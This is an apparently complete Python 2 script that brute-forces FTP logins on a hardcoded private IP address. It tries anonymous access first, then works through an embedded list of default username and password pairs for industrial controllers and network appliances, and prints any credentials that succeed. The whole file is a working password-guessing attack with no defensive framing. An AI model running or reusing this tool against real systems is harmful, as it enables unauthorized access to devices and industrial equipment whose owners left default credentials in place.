#!/usr/bin/env python

import sys
from ftplib import FTP

target = '192.168.52.107'

wordlist = """
anonymous:anonymous
root:rootpasswd
root:12hrs37
ftp:b1uRR3
admin:admin
localadmin:localadmin
admin:1234
apc:apc
admin:nas
Root:wago
Admin:wago
User:user
Guest:guest
ftp:ftp
admin:password
a:avery
admin:123456
adtec:none
admin:admin12345
none:dpstelecom
instrument:instrument
user:password
root:password
default:default
admin:default
nmt:1234
admin:Janitza
supervisor:supervisor
user1:pass1
avery:avery
IEIeMerge:eMerge
ADMIN:12345
beijer:beijer
Admin:admin
admin:1234
admin:1111
root:admin
se:1234
admin:stingray
device:apc
apc:apc
dm:ftp
dmftp:ftp
httpadmin:fhttpadmin
user:system
MELSEC:MELSEC
QNUDECPU:QNUDECPU
ftp_boot:ftp_boot
uploader:ZYPCOM
ftpuser:password
USER:USER
qbf77101:hexakisoctahedron
ntpupdate:ntpupdate
sysdiag:factorycast@schneider
wsupgrade:wsupgrade
pcfactory:pcfactory
loader:fwdownload
test:testingpw
webserver:webpages
fdrusers:sresurdf
nic2212:poiuypoiuy
user:user00
su:ko2003wa
MayGion:maygion.com
admin:9999
PlcmSpIp:PlcmSpIp
"""

def check_anonymous_login(target):
    try:
        ftp = FTP(target)
        ftp.login()
        print "\n[+] Anonymous login is open."
        print "\n[+] Username : anonymous"
        print "\n[+] Password : anonymous\n"
        ftp.quit()
    except:
        print "\n[-] Anonymous login failed."


def ftp_login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print "\n[!] Credentials have found."
        print "\n[!] Username : {}".format(username)
        print "\n[!] Password : {}".format(password)
        sys.exit(0)
    except:
        print "\n[-] Login for {}:{} failed".format(username,password)

check_anonymous_login(target)
for pair in wordlist.split():
    username, password = pair.split(':')
    ftp_login(target, username.strip(), password.strip())

print "\n[-] Brute force finished. \n"